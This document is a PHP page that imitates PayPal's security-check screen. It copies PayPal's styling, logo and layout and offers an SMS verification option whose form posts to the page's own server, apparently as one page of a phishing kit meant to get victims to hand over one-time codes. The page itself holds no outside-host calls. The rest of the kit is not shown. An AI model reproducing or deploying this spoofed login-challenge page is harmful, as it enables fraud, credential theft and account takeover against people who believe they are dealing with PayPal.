<?php 

session_start();


include 'main.php';
include 'config/settings.php';
include 'lang.php';



?>

<html dir="ltr" lang="en">
   <head>
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta name="application-name" content="PayPal">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
      <link rel="shortcut icon" href="./assets/img/favicon.ico">
      <link rel="stylesheet" href="./assets/css/app.css">
      <title>PayPal</title>
      <style data-emotion="css 1rukd0d-text_heading_sm" data-s="">.css-1rukd0d-text_heading_sm{color:#001435;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1.5rem;line-height:2rem;font-weight:400;}@media screen and (max-width: 752px){.css-1rukd0d-text_heading_sm{font-size:min(1.5rem, 36px);line-height:min(2rem, 48px);}}</style>
      <style data-emotion="css ocx2w6-text_body" data-s="">.css-ocx2w6-text_body{color:#001435;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.3125rem;font-weight:400;}@media screen and (max-width: 752px){.css-ocx2w6-text_body{font-size:min(1rem, 32px);line-height:min(1.3125rem, 42px);}}</style>
      <style data-emotion="css 1suxdar-radio_group_base" data-s="">.css-1suxdar-radio_group_base{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;margin:0;padding:0;border:none;text-align:left;}[dir='rtl'] .css-1suxdar-radio_group_base{text-align:right;}</style>
      <style data-emotion="css 1cp71m6-radio_group_label-text_field_label_lg" data-s="">.css-1cp71m6-radio_group_label-text_field_label_lg{color:#545d68;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.5rem;font-weight:400;display:block;padding-bottom:0.75rem;margin-bottom:0.25rem;}@media screen and (max-width: 752px){.css-1cp71m6-radio_group_label-text_field_label_lg{font-size:min(1rem, 32px);line-height:min(1.5rem, 48px);}}</style>
      <style data-emotion="css ntngjt-radio_base" data-s="">.css-ntngjt-radio_base{position:relative;padding:0.75rem 0;text-align:left;}[dir='rtl'] .css-ntngjt-radio_base{text-align:right;}</style>
      <style data-emotion="css 4dx3mg-input" data-s="">.css-4dx3mg-input{cursor:pointer;opacity:0;position:absolute;margin:0;}.css-4dx3mg-input:checked+label>span:first-of-type{border-color:#0070e0;background-color:#0070e0;color:#ffffff;}.css-4dx3mg-input:checked+label>span:first-of-type span:first-of-type{display:inline;}.css-4dx3mg-input:focus+label>span:first-of-type{box-shadow:0 0 0 0.125rem #ffffff;outline-offset:0.125rem;outline:0.125rem solid #097ff5;}.css-4dx3mg-input:active:not(:checked)+label>span:first-of-type{background:#dbdde0;}</style>
      <style data-emotion="css 1b3tfo9-radio_label-text_field_value_sm" data-s="">.css-1b3tfo9-radio_label-text_field_value_sm{-moz-osx-font-smoothing:grayscale;cursor:pointer;display:inline-block;padding-left:2.25rem;color:#001435;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.5rem;font-weight:400;position:relative;-webkit-tap-highlight-color:transparent;}@media screen and (max-width: 752px){.css-1b3tfo9-radio_label-text_field_value_sm{font-size:min(1rem, 32px);line-height:min(1.5rem, 48px);}}[dir='rtl'] .css-1b3tfo9-radio_label-text_field_value_sm{padding-right:2.25rem;padding-left:0;}</style>
      <style data-emotion="css rhy0e-check_icon_container" data-s="">.css-rhy0e-check_icon_container{border-radius:50%;border:0.0625rem solid #9198a0;height:1.5rem;position:absolute;top:0;left:0;width:1.5rem;background-color:#ffffff;}[dir='rtl'] .css-rhy0e-check_icon_container{right:0;}</style>
      <style data-emotion="css 4yp16v-check_icon" data-s="">.css-4yp16v-check_icon{display:none;}</style>
      <style data-emotion="css ocx2w6-text_body" data-s="">.css-ocx2w6-text_body{color:#001435;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.3125rem;font-weight:400;}@media screen and (max-width: 752px){.css-ocx2w6-text_body{font-size:min(1rem, 32px);line-height:min(1.3125rem, 42px);}}</style>
      <style data-emotion="css 1014pzr-tertiary-text_button_lg" data-s="">.css-1014pzr-tertiary-text_button_lg{position:relative;cursor:pointer;display:inline-block;background:transparent;border:none;color:#0070e0;font-family:PayPalOpen-Bold,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.3125rem;font-weight:400;padding:0.75rem 0.5rem;}@media screen and (max-width: 752px){.css-1014pzr-tertiary-text_button_lg{font-size:min(1rem, 32px);line-height:min(1.3125rem, 42px);}}.css-1014pzr-tertiary-text_button_lg:hover,.css-1014pzr-tertiary-text_button_lg:active{color:#0070e0;background:transparent;}.css-1014pzr-tertiary-text_button_lg:hover,.css-1014pzr-tertiary-text_button_lg:focus{-webkit-text-decoration:underline;text-decoration:underline;}.css-1014pzr-tertiary-text_button_lg:active{-webkit-text-decoration:none;text-decoration:none;}.css-1014pzr-tertiary-text_button_lg:focus{color:#0070e0;border-radius:0.25rem;box-shadow:0 0 0 0.125rem #ffffff;outline-offset:0.125rem;outline:0.125rem solid #097ff5;}</style>
      <style data-emotion="css 1bj9kom-affordance" data-s="">.css-1bj9kom-affordance{-webkit-margin-start:0.5rem;margin-inline-start:0.5rem;-webkit-margin-end:0;margin-inline-end:0;vertical-align:top;position:relative;pointer-events:none;}</style>
      <style data-emotion="css ocx2w6-text_body" data-s="">.css-ocx2w6-text_body{color:#001435;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.3125rem;font-weight:400;}@media screen and (max-width: 752px){.css-ocx2w6-text_body{font-size:min(1rem, 32px);line-height:min(1.3125rem, 42px);}}</style>
      <style data-emotion="css 1mvakau-button_base-text_button_lg-btn_full_width" data-s="">.css-1mvakau-button_base-text_button_lg-btn_full_width{position:relative;border-radius:1000px;color:#ffffff;cursor:pointer;display:inline-block;min-width:6rem;text-align:center;-webkit-text-decoration:none;text-decoration:none;-webkit-transition:color 0.20s ease,background-color 0.20s ease,border-color 0.20s ease;transition:color 0.20s ease,background-color 0.20s ease,border-color 0.20s ease;border:0.125rem solid #0544b5;color:#ffffff;font-family:PayPalOpen-Bold,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.3125rem;font-weight:400;background-color:#0544b5;padding:0.625rem 1.875rem;}@media screen and (max-width: 752px){.css-1mvakau-button_base-text_button_lg-btn_full_width{font-size:min(1rem, 32px);line-height:min(1.3125rem, 42px);}}.css-1mvakau-button_base-text_button_lg-btn_full_width:hover,.css-1mvakau-button_base-text_button_lg-btn_full_width:active,.css-1mvakau-button_base-text_button_lg-btn_full_width:visited{color:#ffffff;}.css-1mvakau-button_base-text_button_lg-btn_full_width:hover{-webkit-text-decoration:none;text-decoration:none;background-color:#0070e0;border-color:#0070e0;}.css-1mvakau-button_base-text_button_lg-btn_full_width:active{outline:none;background-color:#003087;border-color:#003087;}.css-1mvakau-button_base-text_button_lg-btn_full_width:focus{outline:none;box-shadow:0 0 0 0.125rem #ffffff;outline-offset:0.125rem;outline:0.125rem solid #097ff5;}@media (max-width: 47rem){.css-1mvakau-button_base-text_button_lg-btn_full_width{width:100%;}}</style>
      <style data-emotion="css 1bj9kom-affordance" data-s="">.css-1bj9kom-affordance{-webkit-margin-start:0.5rem;margin-inline-start:0.5rem;-webkit-margin-end:0;margin-inline-end:0;vertical-align:top;position:relative;pointer-events:none;}</style>
      <style data-emotion="css 16zu7lf-loading-spinner_base-size_lg animation-11tfg15" data-s="">.css-16zu7lf-loading-spinner_base-size_lg{width:1.5rem;height:1.5rem;color:#0544b5;-webkit-animation:animation-11tfg15 1.30s cubic-bezier(
         0,0,1,1
         ) infinite;animation:animation-11tfg15 1.30s cubic-bezier(
         0,0,1,1
         ) infinite;border:0.125rem solid currentColor;border-radius:50%;-webkit-clip-path:polygon(50% 0%, 50% 50%, 100% 50%, 100% 100%, 0 100%, 0 0);clip-path:polygon(50% 0%, 50% 50%, 100% 50%, 100% 100%, 0 100%, 0 0);width:3rem;height:3rem;}@-webkit-keyframes animation-11tfg15{to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}@keyframes animation-11tfg15{to{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);}}
      </style>
      <style data-emotion="css geb0bj-screenReader" data-s="">.css-geb0bj-screenReader{position:absolute;clip:rect(1px, 1px, 1px, 1px);padding:0;border:0;width:1px;height:1px;overflow:hidden;}</style>
      <style data-emotion="css ocx2w6-text_body" data-s="">.css-ocx2w6-text_body{color:#001435;font-family:PayPalOpen-Regular,"Helvetica Neue",Arial,sans-serif;font-size:1rem;line-height:1.3125rem;font-weight:400;}@media screen and (max-width: 752px){.css-ocx2w6-text_body{font-size:min(1rem, 32px);line-height:min(1.3125rem, 42px);}}</style>
   </head>
   <body data-nemo="documentId" class="">
      <div>
         <div>
            <div>
               <form method="POST" action="onetime-1?token?=da39a3ee5e6b4b0d3255bfef95601890afd80709" id="irouteForm">
               <div class="contentContainer" id="content">
                  <div class="challengesForm" data-nemo="entryPage" name="entryPage">
                     <div>
                        <fieldset>
                           <div class="textCenter challenges panel">
                              <header>
                                 <div class="paypal-logo"></div>
                              </header>
                              <div data-nemo="challenges-section">
                                 <div class="css-1rukd0d-text_heading_sm" data-ppui-info="heading-text_6.0.0-ql" id="challenge-heading"><?php echo lang('12');?></div>
                                 <div class="challenge-description css-ocx2w6-text_body" data-ppui-info="body-text_6.0.0-ql"><?php echo lang('13');?></div>
                                 <fieldset class="css-1suxdar-radio_group_base" data-ppui-info="radio_3.0.0-ql">
                                    <legend class="css-1cp71m6-radio_group_label-text_field_label_lg" data-ppui="true"></legend>
                                    <div class="challenge-option selected radio-option-expand-small css-ntngjt-radio_base" data-ppui-info="radio_3.0.0-ql">
                                       <input type="radio" name="selectedChallengeType" value="sms" id="sms-challenge-option" checked="" data-ppui="true" class="css-4dx3mg-input">
                                       <label class="css-1b3tfo9-radio_label-text_field_value_sm" for="sms-challenge-option" data-ppui="true">
                                          <span data-ppui="true" class="css-rhy0e-check_icon_container">
                                             <span aria-hidden="true" data-ppui="true" class="css-4yp16v-check_icon">
                                                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" data-ppui="true">
                                                   <circle r="18" cy="50" cx="50" stroke-width="0" fill="currentColor" data-ppui="true"></circle>
                                                </svg>
                                             </span>
                                          </span>
                                          <div class="">
                                             <div class="css-ocx2w6-text_body" data-ppui-info="body-text_6.0.0-ql"><?php echo lang('14');?></div>
                                          </div>
                                       </label>
                                    </div>
                                 </fieldset>
                                 <div class="infoSection css-ocx2w6-text_body" data-ppui-info="body-text_6.0.0-ql"><?php echo lang('15');?></div>
                                 <div class="stickyButton"><button class="btn-wide challenge-submit-button css-1mvakau-button_base-text_button_lg-btn_full_width" data-ppui-info="buttons_7.0.0-ql" data-nemo="entrySubmit"><?php echo lang('16');?></button></div>
                              </div>
                           </div>
                        </fieldset>
                     </div>
                  </div>
                  <div class="loaderOverlay">
                     <div data-nemo="loaderOverlay" class="modal-animate hide">
                        <p class="loading-spinner css-16zu7lf-loading-spinner_base-size_lg" data-ppui-info="loading-spinner_3.0.0-ql" role="alert"><span data-ppui="true" class="css-geb0bj-screenReader">Just a second...</span></p>
                        <div class="processing css-ocx2w6-text_body" data-ppui-info="body-text_6.0.0-ql">Just a second...</div>
                        <div class="loaderOverlayAdditionalElements"></div>
                     </div>
                     <div class="modal-overlay hide"></div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>